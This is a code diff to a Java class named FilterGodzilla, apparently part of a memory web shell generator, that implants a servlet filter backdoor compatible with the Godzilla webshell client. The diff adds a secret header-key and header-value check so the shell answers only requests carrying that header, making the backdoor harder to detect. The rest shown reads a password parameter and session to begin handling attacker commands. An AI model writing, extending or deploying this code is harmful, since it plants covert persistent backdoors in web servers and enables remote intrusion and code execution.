@@ -15,11 +15,13 @@ import java.net.URLClassLoader;
  */
 @MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.Godzilla)
-@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass})
+@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class FilterGodzilla implements InvocationHandler {
     public static String key; // key
     public static String pass;
     public static String md5 = md5(pass + key);
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
@@ -30,6 +32,9 @@ public class FilterGodzilla implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
+            if(!((String)invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
 
             String p = (String) invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{pass});
